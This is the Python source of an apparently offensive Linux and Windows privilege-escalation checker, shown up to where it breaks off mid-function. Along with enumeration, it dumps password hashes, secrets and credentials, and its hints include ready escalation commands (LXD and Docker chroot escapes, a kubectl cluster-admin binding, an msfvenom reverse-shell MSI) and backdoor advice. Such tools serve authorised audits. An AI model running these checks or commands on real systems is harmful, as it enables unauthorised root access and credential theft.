#!/usr/bin/env python3
"""
Ghost-Privesc - Linux Privilege Escalation Checker
By Gh0st-Bx1 | github.com/Ghost-Bx1
"""

import os
import sys
import stat
import subprocess
import argparse
import json
import re
import pwd
import grp
from datetime import datetime
from threading import Lock

C = {
    "R": "\033[91m",
    "G": "\033[92m",
    "Y": "\033[93m",
    "B": "\033[94m",
    "M": "\033[95m",
    "C": "\033[96m",
    "W": "\033[97m",
    "DIM": "\033[2m",
    "BOLD": "\033[1m",
    "X": "\033[0m",
}

BANNER = f"""
{C['R']}  _____ _               _     ____       _
 / ____| |             | |   |  _ \\     (_)
| |  __| |__   ___  ___| |_  | |_) |_ __ ___   _____  ___  ___
| | |_ | '_ \\ / _ \\/ __| __| |  __/| '__| \\ \\ / / _ \\/ __|/ __|
| |__| | | | | (_) \\__ \\ |_  | |   | |  | |\\ V /  __/ (__\\__ \\
 \\_____|_| |_|\\___/|___/\\__| |_|   |_|  |_| \\_/ \\___|\\___|___/{C['X']}

{C['Y']}  Ghost-Privesc v2.0.0  |  Linux & Windows Privilege Escalation Checker{C['X']}
{C['DIM']}  By Gh0st-Bx1  |  github.com/Ghost-Bx1{C['X']}
"""

_lock = Lock()
_achados = []
_score = 0


def _p(nivel, msg, detalhe=""):
    global _score
    cores = {
        "CRITICO": C["R"] + C["BOLD"],
        "ALTO":    C["R"],
        "MEDIO":   C["Y"],
        "BAIXO":   C["C"],
        "INFO":    C["DIM"],
        "OK":      C["G"],
    }
    pontos = {"CRITICO": 10, "ALTO": 5, "MEDIO": 3, "BAIXO": 1, "INFO": 0, "OK": 0}
    cor = cores.get(nivel, C["W"])
    tag = f"[{nivel:<7}]"
    with _lock:
        print(f"  {cor}{tag}{C['X']} {msg}")
        if detalhe:
            for linha in detalhe.strip().split("\n"):
                print(f"           {C['DIM']}{linha}{C['X']}")
        if nivel in pontos:
            _score += pontos[nivel]
        _achados.append({"nivel": nivel, "msg": msg, "detalhe": detalhe})


def _run(cmd, timeout=5):
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        return r.stdout.strip(), r.stderr.strip()
    except Exception:
        return "", ""


def _secao(titulo):
    print(f"\n  {C['B']}{C['BOLD']}[=] {titulo}{C['X']}")
    print(f"  {C['DIM']}{'─' * 60}{C['X']}")


# ─────────────────────────────────────────────────────────────────
# Informacoes do sistema
# ─────────────────────────────────────────────────────────────────

def info_sistema():
    _secao("INFORMACOES DO SISTEMA")

    hostname, _ = _run("hostname")
    kernel, _ = _run("uname -r")
    os_info, _ = _run("cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"'")
    arch, _ = _run("uname -m")
    uptime, _ = _run("uptime -p 2>/dev/null || uptime")

    _p("INFO", f"Hostname  : {hostname}")
    _p("INFO", f"Kernel    : {kernel}")
    _p("INFO", f"OS        : {os_info}")
    _p("INFO", f"Arch      : {arch}")
    _p("INFO", f"Uptime    : {uptime}")

    user, _ = _run("whoami")
    uid, _ = _run("id")
    _p("INFO", f"Usuario   : {user}")
    _p("INFO", f"ID        : {uid}")

    groups, _ = _run("groups")
    grupos_interesse = ["sudo", "wheel", "adm", "docker", "lxd", "disk", "shadow", "video", "audio"]
    for g in grupos_interesse:
        if g in groups.split():
            if g in ["sudo", "wheel"]:
                _p("CRITICO", f"Usuario no grupo '{g}' — sudo/root provavel")
            elif g in ["docker", "lxd"]:
                _p("ALTO", f"Usuario no grupo '{g}' — escape de container possivel")
            elif g in ["disk", "shadow", "adm"]:
                _p("ALTO", f"Usuario no grupo '{g}' — acesso privilegiado a sistema/logs")
            else:
                _p("MEDIO", f"Usuario no grupo '{g}'")


# ─────────────────────────────────────────────────────────────────
# Kernel exploits conhecidos
# ─────────────────────────────────────────────────────────────────

KERNEL_EXPLOITS = [
    ("3.", "DirtyCow (CVE-2016-5195)", "CRITICO"),
    ("4.4", "DirtyCow (CVE-2016-5195) / eBPF privesc", "CRITICO"),
    ("4.8", "eBPF privesc (CVE-2017-16995)", "CRITICO"),
    ("4.13", "DCCP double-free (CVE-2017-8890)", "ALTO"),
    ("4.14", "eBPF verifier bypass", "ALTO"),
    ("5.7", "DirtyPipe (CVE-2022-0847)", "CRITICO"),
    ("5.8", "DirtyPipe (CVE-2022-0847)", "CRITICO"),
    ("5.10", "DirtyPipe (CVE-2022-0847) / Netfilter UAF (CVE-2022-25636)", "ALTO"),
    ("5.11", "DirtyPipe (CVE-2022-0847)", "CRITICO"),
    ("5.12", "DirtyPipe (CVE-2022-0847)", "CRITICO"),
    ("5.15", "Netfilter UAF (CVE-2022-32250)", "ALTO"),
    ("5.16", "nftables UAF (CVE-2022-34918)", "ALTO"),
]


def verificar_kernel():
    _secao("KERNEL / CVEs CONHECIDOS")
    kernel, _ = _run("uname -r")
    versao_str = kernel.split("-")[0]

    vulneravel = False
    for prefixo, exploit, nivel in KERNEL_EXPLOITS:
        if versao_str.startswith(prefixo):
            _p(nivel, f"Kernel {kernel} pode ser vulneravel: {exploit}")
            vulneravel = True

    if not vulneravel:
        _p("OK", f"Kernel {kernel} sem exploit classico mapeado (nao garante seguranca)")

    # PTI / SMEP / SMAPKASLR
    mitigacoes, _ = _run("cat /proc/cpuinfo | grep flags | head -1")
    for m in ["pti", "smep", "smap", "ibrs", "stibp"]:
        if m in mitigacoes:
            _p("INFO", f"Mitigacao CPU ativa: {m.upper()}")


# ─────────────────────────────────────────────────────────────────
# sudo -l
# ─────────────────────────────────────────────────────────────────

GTFOBINS_SUDO = [
    "vim", "vi", "nano", "less", "more", "man", "find", "awk", "perl",
    "python", "python3", "ruby", "lua", "tee", "cp", "mv", "chmod",
    "chown", "dd", "env", "bash", "sh", "dash", "nmap", "tcpdump",
    "git", "ftp", "socat", "nc", "netcat", "curl", "wget", "tar",
    "zip", "unzip", "rsync", "screen", "tmux", "strace", "ltrace",
    "gdb", "node", "php", "mysql", "psql", "sqlite3", "docker", "kubectl",
    "systemctl", "journalctl", "apt", "pip", "pip3", "npm",
]


def verificar_sudo():
    _secao("SUDO")
    saida, erro = _run("sudo -l -n 2>&1")
    if "may not run" in saida or "not allowed" in saida:
        _p("OK", "Usuario sem permissoes sudo")
        return
    if "password" in erro.lower() or "password" in saida.lower():
        _p("INFO", "sudo requer senha (sem NOPASSWD visivel)")
        return

    if "ALL" in saida and "NOPASSWD" in saida:
        _p("CRITICO", "sudo ALL NOPASSWD — root imediato", saida)
        return

    if "NOPASSWD" in saida:
        linhas = [l for l in saida.split("\n") if "NOPASSWD" in l]
        for linha in linhas:
            _p("ALTO", f"NOPASSWD: {linha.strip()}")
            for bin_ in GTFOBINS_SUDO:
                if bin_ in linha:
                    _p("CRITICO", f"GTFOBins: {bin_} com NOPASSWD => privesc direto",
                       f"Ref: https://gtfobins.github.io/gtfobins/{bin_}/#sudo")
    elif saida:
        _p("MEDIO", "Usuario tem permissoes sudo (requer senha)", saida[:300])


# ─────────────────────────────────────────────────────────────────
# SUID / SGID
# ─────────────────────────────────────────────────────────────────

GTFOBINS_SUID = [
    "bash", "sh", "dash", "zsh", "fish", "nmap", "vim", "vi", "find",
    "awk", "perl", "python", "python3", "ruby", "lua", "env", "tclsh",
    "node", "php", "cp", "mv", "tee", "curl", "wget", "nc", "netcat",
    "socat", "tar", "zip", "gzip", "base64", "openssl", "xxd",
    "pkexec", "doas", "sudo", "su", "passwd", "newgrp",
    "docker", "podman", "lxc", "lxd-agent",
    "strace", "gdb", "ltrace",
    "systemctl", "journalctl",
    "xterm", "Xorg",
    "taskset", "ionice", "nice",
    "fping", "ping",
]


def verificar_suid():
    _secao("SUID / SGID")
    saida, _ = _run("find / -perm -4000 -type f 2>/dev/null", timeout=30)
    sgid_saida, _ = _run("find / -perm -2000 -type f 2>/dev/null", timeout=30)

    for linha in saida.strip().split("\n"):
        if not linha:
            continue
        nome = os.path.basename(linha)
        if nome in GTFOBINS_SUID:
            _p("CRITICO", f"SUID GTFOBins: {linha}",
               f"Ref: https://gtfobins.github.io/gtfobins/{nome}/#suid")
        else:
            _p("BAIXO", f"SUID: {linha}")

    for linha in sgid_saida.strip().split("\n"):
        if not linha:
            continue
        _p("INFO", f"SGID: {linha}")

    if not saida and not sgid_saida:
        _p("OK", "Nenhum binario SUID/SGID encontrado")


# ─────────────────────────────────────────────────────────────────
# Capabilities
# ─────────────────────────────────────────────────────────────────

CAPS_PERIGOSAS = {
    "cap_setuid":       "CRITICO",
    "cap_setgid":       "CRITICO",
    "cap_sys_admin":    "CRITICO",
    "cap_sys_ptrace":   "ALTO",
    "cap_net_raw":      "MEDIO",
    "cap_net_admin":    "MEDIO",
    "cap_dac_override": "ALTO",
    "cap_dac_read_search": "ALTO",
    "cap_chown":        "ALTO",
    "cap_fowner":       "ALTO",
    "cap_sys_module":   "CRITICO",
    "cap_sys_rawio":    "CRITICO",
    "cap_sys_boot":     "ALTO",
    "cap_mknod":        "MEDIO",
    "cap_audit_write":  "BAIXO",
    "cap_kill":         "BAIXO",
}


def verificar_capabilities():
    _secao("CAPABILITIES")
    saida, _ = _run("getcap -r / 2>/dev/null", timeout=30)
    if not saida:
        _p("OK", "Nenhuma capability especial encontrada")
        return

    for linha in saida.strip().split("\n"):
        if not linha:
            continue
        nivel_max = "INFO"
        for cap, nivel in CAPS_PERIGOSAS.items():
            if cap in linha.lower():
                niveis_ord = ["INFO", "BAIXO", "MEDIO", "ALTO", "CRITICO"]
                if niveis_ord.index(nivel) > niveis_ord.index(nivel_max):
                    nivel_max = nivel
        _p(nivel_max, f"Capability: {linha}")


# ─────────────────────────────────────────────────────────────────
# Cron jobs
# ─────────────────────────────────────────────────────────────────

def verificar_cron():
    _secao("CRON JOBS")

    arquivos_cron = [
        "/etc/crontab",
        "/etc/cron.d/",
        "/var/spool/cron/",
        "/var/spool/cron/crontabs/",
        "/etc/cron.hourly/",
        "/etc/cron.daily/",
        "/etc/cron.weekly/",
        "/etc/cron.monthly/",
    ]

    encontrou = False
    for caminho in arquivos_cron:
        if os.path.isdir(caminho):
            for arq in os.listdir(caminho):
                full = os.path.join(caminho, arq)
                conteudo, _ = _run(f"cat '{full}' 2>/dev/null")
                if conteudo:
                    _analisar_cron(full, conteudo)
                    encontrou = True
        elif os.path.isfile(caminho):
            conteudo, _ = _run(f"cat '{caminho}' 2>/dev/null")
            if conteudo:
                _analisar_cron(caminho, conteudo)
                encontrou = True

    if not encontrou:
        _p("INFO", "Nenhum cron job acessivel encontrado")


def _analisar_cron(arquivo, conteudo):
    for linha in conteudo.split("\n"):
        linha = linha.strip()
        if not linha or linha.startswith("#"):
            continue
        if any(c in linha for c in ["*", "@reboot", "@hourly", "@daily"]):
            # Extrair script/comando
            partes = linha.split()
            for p in partes:
                if p.startswith("/"):
                    if not os.path.exists(p):
                        _p("ALTO", f"Cron aponta para arquivo inexistente: {p}",
                           f"Arquivo: {arquivo}\nLinha: {linha}")
                    elif os.access(p, os.W_OK):
                        _p("CRITICO", f"Script de cron gravavel: {p}",
                           f"Arquivo: {arquivo}\nLinha: {linha}")
                    else:
                        dir_ = os.path.dirname(p)
                        if os.access(dir_, os.W_OK):
                            _p("ALTO", f"Diretorio do cron gravavel (hijack): {dir_}",
                               f"Script: {p}")
                        else:
                            _p("INFO", f"Cron: {linha[:80]}")


# ─────────────────────────────────────────────────────────────────
# Servicos / systemd
# ─────────────────────────────────────────────────────────────────

def verificar_servicos():
    _secao("SERVICOS E UNIT FILES")

    unit_dirs = [
        "/etc/systemd/system/",
        "/lib/systemd/system/",
        "/usr/lib/systemd/system/",
    ]

    for d in unit_dirs:
        if not os.path.isdir(d):
            continue
        for arq in os.listdir(d):
            full = os.path.join(d, arq)
            if not arq.endswith(".service"):
                continue
            if os.access(full, os.W_OK):
                _p("CRITICO", f"Unit file gravavel: {full}",
                   "Modifique ExecStart para shell reversa e reinicie o servico.")
            else:
                conteudo, _ = _run(f"cat '{full}' 2>/dev/null")
                for linha in conteudo.split("\n"):
                    if linha.startswith("ExecStart="):
                        exec_bin = linha.split("=", 1)[1].split()[0].strip()
                        if exec_bin and os.access(exec_bin, os.W_OK):
                            _p("CRITICO", f"Binario do servico gravavel: {exec_bin}",
                               f"Unit: {full}")
                        elif exec_bin:
                            dir_ = os.path.dirname(exec_bin)
                            if dir_ and os.access(dir_, os.W_OK):
                                _p("ALTO", f"Diretorio do binario gravavel: {dir_}",
                                   f"Unit: {full}")


# ─────────────────────────────────────────────────────────────────
# PATH hijacking
# ─────────────────────────────────────────────────────────────────

def verificar_path():
    _secao("PATH HIJACKING")

    path_env = os.environ.get("PATH", "")
    dirs = path_env.split(":")

    for d in dirs:
        if not d:
            continue
        if d in [".", "..", ""]:
            _p("CRITICO", f"PATH contem diretorio relativo: '{d}'",
               "Comandos no diretorio atual sao executados antes dos do sistema.")
            continue
        if not os.path.isdir(d):
            _p("MEDIO", f"PATH contem diretorio inexistente: {d}",
               "Crie o diretorio e coloque um binario malicioso.")
        elif os.access(d, os.W_OK):
            _p("ALTO", f"Diretorio gravavel no PATH: {d}")
        else:
            _p("INFO", f"PATH: {d}")


# ─────────────────────────────────────────────────────────────────
# NFS shares com no_root_squash
# ─────────────────────────────────────────────────────────────────

def verificar_nfs():
    _secao("NFS")

    exports, _ = _run("cat /etc/exports 2>/dev/null")
    if not exports:
        _p("INFO", "Sem /etc/exports acessivel")
        return

    for linha in exports.strip().split("\n"):
        if linha.startswith("#") or not linha.strip():
            continue
        if "no_root_squash" in linha:
            _p("CRITICO", f"NFS com no_root_squash: {linha}",
               "Monte o share como root em outra maquina, crie um SUID shell, execute aqui.")
        elif "no_all_squash" in linha:
            _p("ALTO", f"NFS com no_all_squash: {linha}")
        else:
            _p("INFO", f"NFS export: {linha}")


# ─────────────────────────────────────────────────────────────────
# Senhas em arquivos
# ─────────────────────────────────────────────────────────────────

PADROES_SENHA = [
    (r"password\s*=\s*\S+", "password="),
    (r"passwd\s*=\s*\S+", "passwd="),
    (r"secret\s*=\s*\S+", "secret="),
    (r"api[_-]?key\s*=\s*\S+", "api_key="),
    (r"token\s*=\s*\S+", "token="),
    (r"DB_PASS\s*=\s*\S+", "DB_PASS="),
    (r"MYSQL_PASSWORD\s*=\s*\S+", "MYSQL_PASSWORD="),
]

ARQUIVOS_SENSIVEIS = [
    "/etc/shadow",
    os.path.expanduser("~/.bash_history"),
    os.path.expanduser("~/.zsh_history"),
    os.path.expanduser("~/.mysql_history"),
    os.path.expanduser("~/.psql_history"),
    os.path.expanduser("~/.config/"),
    "/var/www/",
    "/opt/",
    os.path.expanduser("~/"),
]


def verificar_senhas():
    _secao("SENHAS E CREDENCIAIS")

    # /etc/shadow legivel?
    shadow, _ = _run("cat /etc/shadow 2>/dev/null")
    if shadow:
        linhas = [l for l in shadow.split("\n") if ":" in l and l.split(":")[1] not in ["*", "!", "x", ""]]
        if linhas:
            _p("CRITICO", f"/etc/shadow acessivel com {len(linhas)} hash(es) de senha",
               "\n".join(linhas[:5]))
        else:
            _p("ALTO", "/etc/shadow legivel (sem hashes uteis)")

    # historico de shell
    for hist in [
        os.path.expanduser("~/.bash_history"),
        os.path.expanduser("~/.zsh_history"),
    ]:
        if os.path.isfile(hist):
            conteudo, _ = _run(f"grep -iE '(password|passwd|--password|-p |mysql |psql )' '{hist}' 2>/dev/null | head -20")
            if conteudo:
                _p("ALTO", f"Possiveis credenciais no historico: {hist}", conteudo)
            else:
                _p("INFO", f"Historico encontrado: {hist}")

    # .ssh
    ssh_dir = os.path.expanduser("~/.ssh/")
    if os.path.isdir(ssh_dir):
        for arq in os.listdir(ssh_dir):
            full = os.path.join(ssh_dir, arq)
            if arq in ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa"]:
                _p("ALTO", f"Chave SSH privada: {full}")
            elif arq == "authorized_keys":
                conteudo, _ = _run(f"cat '{full}' 2>/dev/null")
                count = len([l for l in conteudo.split("\n") if l.strip()])
                _p("INFO", f"authorized_keys: {count} chave(s)")

    # arquivos .env
    env_files, _ = _run("find / -name '.env' -readable 2>/dev/null | head -20", timeout=20)
    for arq in env_files.strip().split("\n"):
        if arq:
            _p("ALTO", f"Arquivo .env encontrado: {arq}")

    # config files com senha
    config_files, _ = _run(
        "find /var /opt /home /etc -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.php' -o -name 'wp-config.php' 2>/dev/null | head -50",
        timeout=20,
    )
    for arq in config_files.strip().split("\n"):
        if not arq or not os.path.isfile(arq):
            continue
        conteudo, _ = _run(f"grep -iE '(password|passwd|secret|api_key)\\s*=' '{arq}' 2>/dev/null | head -5")
        if conteudo:
            _p("ALTO", f"Credencial em: {arq}", conteudo[:200])


# ─────────────────────────────────────────────────────────────────
# Docker / LXD / container escape
# ─────────────────────────────────────────────────────────────────

def verificar_containers():
    _secao("DOCKER / LXD / CONTAINERS")

    # Dentro de container?
    cgroup, _ = _run("cat /proc/1/cgroup 2>/dev/null")
    dockerenv = os.path.exists("/.dockerenv")
    if dockerenv or "docker" in cgroup or "lxc" in cgroup:
        _p("MEDIO", "Executando dentro de container (Docker/LXC)")

        # Privilegiado?
        cap, _ = _run("cat /proc/self/status 2>/dev/null | grep CapEff")
        if "ffffffffffffffff" in cap or "0000003fffffffff" in cap:
            _p("CRITICO", "Container privilegiado detectado — montagem do host possivel",
               "mount /dev/sda1 /mnt && chroot /mnt")

        # /var/run/docker.sock acessivel
        if os.access("/var/run/docker.sock", os.W_OK):
            _p("CRITICO", "/var/run/docker.sock gravavel dentro do container",
               "docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
    else:
        _p("INFO", "Nao parece estar dentro de container")

    # Docker socket no host
    if os.access("/var/run/docker.sock", os.W_OK):
        _p("CRITICO", "/var/run/docker.sock gravavel",
           "docker run -v /:/mnt --rm -it alpine chroot /mnt sh")

    # LXD membership
    grupos, _ = _run("id")
    if "lxd" in grupos:
        _p("CRITICO", "Usuario no grupo lxd — escape para root via LXD init image",
           "lxc image import <alpine.tar.gz> --alias alpine\nlxc init alpine privesc -c security.privileged=true\nlxc config device add privesc disk source=/ path=/mnt/root recursive=true\nlxc start privesc\nlxc exec privesc -- chroot /mnt/root /bin/bash")

    # kubectl
    kubectl, _ = _run("kubectl auth can-i '*' '*' 2>/dev/null")
    if "yes" in kubectl:
        _p("CRITICO", "kubectl com permissao wildcard — cluster admin",
           "kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:default")


# ─────────────────────────────────────────────────────────────────
# Arquivos graváveis em locais sensiveis
# ─────────────────────────────────────────────────────────────────

def verificar_graveis():
    _secao("ARQUIVOS GRAVEIS EM LOCAIS SENSIVEIS")

    locais = [
        ("/etc/passwd", "CRITICO", "Adicione usuario root fake"),
        ("/etc/shadow", "CRITICO", "Sobrescreva hash de senha"),
        ("/etc/sudoers", "CRITICO", "Adicione regra NOPASSWD ALL"),
        ("/etc/hosts", "MEDIO", "DNS spoofing local"),
        ("/etc/crontab", "CRITICO", "Injete comando root via cron"),
        ("/etc/profile", "ALTO", "Backdoor no login de todos os usuarios"),
        ("/etc/bash.bashrc", "ALTO", "Backdoor no bashrc global"),
        ("/root/.bashrc", "CRITICO", "Bashrc do root gravavel"),
        ("/root/.profile", "CRITICO", "Profile do root gravavel"),
    ]

    for caminho, nivel, dica in locais:
        if os.path.isfile(caminho) and os.access(caminho, os.W_OK):
            _p(nivel, f"Arquivo gravavel: {caminho}", dica)


# ─────────────────────────────────────────────────────────────────
# Variaveis de ambiente suspeitas
# ─────────────────────────────────────────────────────────────────

def verificar_env():
    _secao("VARIAVEIS DE AMBIENTE")

    interessantes = ["AWS_", "SECRET", "TOKEN", "PASSWORD", "PASSWD", "API_KEY",
                     "PRIVATE", "DATABASE_URL", "DB_PASS", "REDIS_", "ELASTIC_"]
    for key, val in os.environ.items():
        for i in interessantes:
            if i in key.upper():
                _p("ALTO", f"Variavel sensivel no ambiente: {key}={val[:80]}")
                break

    # LD_PRELOAD / LD_LIBRARY_PATH
    for v in ["LD_PRELOAD", "LD_LIBRARY_PATH"]:
        val = os.environ.get(v, "")
        if val:
            _p("CRITICO", f"{v} definido: {val}",
               "Pode ser usado para injetar biblioteca maliciosa antes de executaveis SUID.")

    # PYTHONPATH / PERL5LIB
    for v in ["PYTHONPATH", "PERL5LIB", "RUBYLIB", "NODE_PATH"]:
        val = os.environ.get(v, "")
        if val:
            _p("ALTO", f"{v} definido: {val}")


# ─────────────────────────────────────────────────────────────────
# Processos rodando como root
# ─────────────────────────────────────────────────────────────────

def verificar_processos():
    _secao("PROCESSOS COMO ROOT")

    saida, _ = _run("ps aux 2>/dev/null | grep '^root' | grep -v grep | head -30")
    if not saida:
        _p("INFO", "Impossivel listar processos (sem ps ou sem permissao)")
        return

    interessantes = ["mysql", "postgres", "redis", "mongo", "elastic", "jenkins",
                     "tomcat", "python", "ruby", "perl", "node", "php", "apache",
                     "nginx", "http", "ftp", "smtp", "irc", "cups", "avahi"]

    for linha in saida.strip().split("\n"):
        for p in interessantes:
            if p in linha.lower():
                _p("MEDIO", f"Processo root potencialmente exploravel: {linha[:100]}")
                break


# ─────────────────────────────────────────────────────────────────
# Portas internas / servicos locais
# ─────────────────────────────────────────────────────────────────

def verificar_portas_internas():
    _secao("PORTAS INTERNAS / LOCALHOST")

    saida, _ = _run("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null")
    if not saida:
        _p("INFO", "Impossivel listar sockets (sem ss/netstat)")
        return

    locais = []
    for linha in saida.strip().split("\n"):
        if "127.0.0.1" in linha or "::1" in linha or "0.0.0.0" in linha:
            locais.append(linha.strip())

    if locais:
        _p("INFO", f"{len(locais)} servico(s) em localhost/0.0.0.0:",
           "\n".join(locais[:15]))
        for l in locais:
            for porta in ["3306", "5432", "6379", "27017", "8080", "8443", "9200"]:
                if f":{porta}" in l:
                    servicos = {"3306": "MySQL", "5432": "PostgreSQL", "6379": "Redis",
                                "27017": "MongoDB", "9200": "Elasticsearch"}
                    nome = servicos.get(porta, f"porta {porta}")
                    _p("MEDIO", f"{nome} escutando localmente (port forward possivel)")


# ─────────────────────────────────────────────────────────────────
# Usuarios e home directories
# ─────────────────────────────────────────────────────────────────

def verificar_usuarios():
    _secao("USUARIOS DO SISTEMA")

    passwd, _ = _run("cat /etc/passwd 2>/dev/null")
    if not passwd:
        _p("INFO", "Sem acesso ao /etc/passwd")
        return

    for linha in passwd.strip().split("\n"):
        partes = linha.split(":")
        if len(partes) < 7:
            continue
        usuario, _, uid, gid, _, home, shell = partes[:7]
        uid = int(uid) if uid.isdigit() else 9999

        if uid == 0 and usuario != "root":
            _p("CRITICO", f"Usuario com UID 0 (root): {usuario}", linha)

        if uid < 1000 and uid > 0:
            continue  # sistema, ignorar

        if shell not in ["/bin/false", "/usr/sbin/nologin", "/sbin/nologin", ""]:
            if home and os.path.isdir(home) and os.access(home, os.R_OK):
                _p("INFO", f"Home acessivel: {usuario} -> {home}")

    # Usuarios com shell valido
    shells_validos, _ = _run("cat /etc/passwd | grep -v nologin | grep -v false | grep -v sync | awk -F: '{if($3>=1000 && $3!=65534) print $0}'")
    if shells_validos:
        _p("INFO", "Usuarios com shell valido:", shells_validos[:300])


# ─────────────────────────────────────────────────────────────────
# Windows Checks
# ─────────────────────────────────────────────────────────────────

def verificar_windows():
    """Verificacoes de privesc para Windows (AlwaysInstallElevated, unquoted paths, DLL hijack)."""
    _p("TITULO", "WINDOWS PRIVILEGE ESCALATION")

    # AlwaysInstallElevated
    try:
        import winreg
        for hive in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
            try:
                k = winreg.OpenKey(hive, r"SOFTWARE\Policies\Microsoft\Windows\Installer")
                val, _ = winreg.QueryValueEx(k, "AlwaysInstallElevated")
                if val == 1:
                    _p("CRITICO", "AlwaysInstallElevated ATIVO — instale .msi para SYSTEM",
                       "msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o x.msi && msiexec /quiet /qn /i x.msi")
            except Exception:
                pass
    except ImportError:
        _p("INFO", "winreg nao disponivel (executando em Linux?)")

    # Servicos com caminhos nao-entre-aspas
    out, _ = _run('wmic service get name,pathname,startmode 2>nul', timeout=10)
    if out:
        for linha in out.splitlines():
            if " " in linha and '"' not in linha and linha.strip():
                partes = linha.split()
                if len(partes) >= 2 and "\\" in partes[0]:
                    _p("ALTO", f"Unquoted Service Path: {linha.strip()[:120]}")

    # DLL Hijacking via PATH
    out2, _ = _run("echo %PATH%", timeout=5)
    if out2:
        for d in out2.split(";"):
            d = d.strip()
            if d and "Users" in d:
                _p("MEDIO", f"Diretorio de usuario no PATH (DLL hijack possivel): {d}")

    # Privilegios do token
    out3, _ = _run("whoami /priv 2>nul", timeout=5)
    privs_perigosos = ["SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege",
                       "SeTcbPrivilege", "SeBackupPrivilege", "SeRestorePrivilege",
                       "SeCreateTokenPrivilege", "SeLoadDriverPrivilege",
                       "SeTakeOwnershipPrivilege", "SeDebugPrivilege"]
    if out3:
        for priv in privs_perigosos:
            if priv in out3 and "Enabled" in out3:
                _p("CRITICO", f"Privilegio de token perigoso habilitado: {priv}",
                   "Potato attacks (PrintSpoofer, RoguePotato, GodPotato) ou Mimikatz")


# ─────────────────────────────────────────────────────────────────
# CVE-2021-4034 PwnKit (pkexec)
# ─────────────────────────────────────────────────────────────────

def verificar_pkexec():
    """Verifica se pkexec esta vulneravel ao CVE-2021-4034 (PwnKit)."""
    _p("TITULO", "CVE-2021-4034 (PWNKIT — pkexec)")
    out, _ = _run("which pkexec 2>/dev/null || command -v pkexec 2>/dev/null")
    if not out or not out.strip():
        _p("INFO", "pkexec nao encontrado")
        return
    pkexec_path = out.strip().split()[0]
    out_v, _ = _run(f"pkexec --version 2>&1")
    _p("INFO", f"pkexec encontrado: {pkexec_path}", out_v.strip()[:60] if out_v else "")
    # Versao vulneravel: polkit < 0.121
    out_pkg, _ = _run("dpkg -l policykit-1 2>/dev/null || rpm -q polkit 2>/dev/null")
    if out_pkg:
        import re as _re2
        m = _re2.search(r'(\d+\.\d+)', out_pkg)
        if m:
            ver = float(m.group(1))
            if ver < 0.121:
                _p("CRITICO", f"polkit {ver} VULNERAVEL a CVE-2021-4034 (PwnKit)!",
                   "PoC: https://github.com/berdav/CVE-2021-4034")
            else:
                _p("INFO", f"polkit {ver} provavelmente corrigido (>= 0.121)")
        else:
            _p("ALERTA", "Nao foi possivel determinar versao do polkit — verifique manualmente")
    else:
        _p("INFO", "Nao foi possivel verificar versao do polkit via dpkg/rpm")


# ─────────────────────────────────────────────────────────────────
# Shared Library Hijacking
# ─────────────────────────────────────────────────────────────────

def verificar_lib_hijacking():
    """Verifica shared library hijacking via LD_LIBRARY_PATH e ldd em SUID binarios."""
    _p("TITULO", "SHARED LIBRARY HIJACKING")

    # LD_LIBRARY_PATH env check
    ldlp = os.environ.get("LD_LIBRARY_PATH", "")
    if ldlp:
        for d in ldlp.split(":"):
            if d and os.access(d, os.W_OK):
                _p("CRITICO", f"LD_LIBRARY_PATH gravavel: {d}",
                   "Coloque uma .so maliciosa neste diretorio para hijack de libs")

    # /etc/ld.so.conf.d
    out_dirs, _ = _run("ldconfig -v 2>/dev/null | grep -v ^'\\t'")
    if out_dirs:
        for linha in out_dirs.splitlines()[:20]:
            d = linha.rstrip(":")
            if d and os.path.isdir(d) and os.access(d, os.W_OK):
                _p("CRITICO", f"Diretorio ld.so gravavel: {d}",
                   "Coloque uma .so maliciosa e execute ldconfig para hijack global")

    # SUID binarios com dependencias gravieis
    out_suid, _ = _run("find / -perm -4000 -type f 2>/dev/null", timeout=15)
    if out_suid:
        suid_bins = out_suid.strip().splitlines()[:10]
        for b in suid_bins:
            b = b.strip()
            if not b:
                continue
            out_ldd, _ = _run(f"ldd {b} 2>/dev/null", timeout=5)
            if out_ldd:
                for lib_linha in out_ldd.splitlines():
                    if "not found" in lib_linha:
                        lib_nome = lib_linha.strip().split()[0]
                        _p("ALTO", f"SUID '{b}' procura lib INEXISTENTE: {lib_nome}",
                           "Crie a lib maliciosa em um diretorio no LD_LIBRARY_PATH")


# ─────────────────────────────────────────────────────────────────
# Sudo Token Reuse (ptrace)
# ─────────────────────────────────────────────────────────────────

def verificar_sudo_token():
    """Verifica reuso de token sudo via ptrace (sudo_inject)."""
    _p("TITULO", "SUDO TOKEN REUSE (ptrace)")
    # Verificar se ptrace esta permitido
    out_yama, _ = _run("cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null")
    scope = out_yama.strip() if out_yama else "desconhecido"
    if scope == "0":
        _p("CRITICO", f"ptrace_scope=0 — ptrace irrestrito! sudo token reuse possivel",
           "PoC: https://github.com/nongiach/sudo_inject")
    elif scope == "1":
        _p("MEDIO", f"ptrace_scope=1 — apenas processos filho; sudo_inject pode funcionar se sudo estiver ativo")
    else:
        _p("INFO", f"ptrace_scope={scope} — reuso de token menos provavel")

    # Verificar processos sudo ativos
    out_sudo, _ = _run("ps aux 2>/dev/null | grep sudo | grep -v grep")
    if out_sudo:
        _p("ALTO", "Processo sudo em execucao — token ativo no momento!", out_sudo.strip()[:120])
    else:
        _p("INFO", "Nenhum processo sudo ativo detectado")


# ─────────────────────────────────────────────────────────────────
# Monitoramento de Processos (pspy-like)
# ─────────────────────────────────────────────────────────────────

def monitorar_processos(duracao=15):
    """Monitora processos novos por 'duracao' segundos (similar ao pspy)."""
    import time
    _p("TITULO", f"MONITOR DE PROCESSOS ({duracao}s) — pspy-like")
    visto = set()
    inicio = time.time()
    _p("INFO", f"Monitorando por {duracao}s. Processos novos serao exibidos...")
    while time.time() - inicio < duracao:
        out, _ = _run("ps -eo pid,user,args --no-headers 2>/dev/null", timeout=3)
        if out:
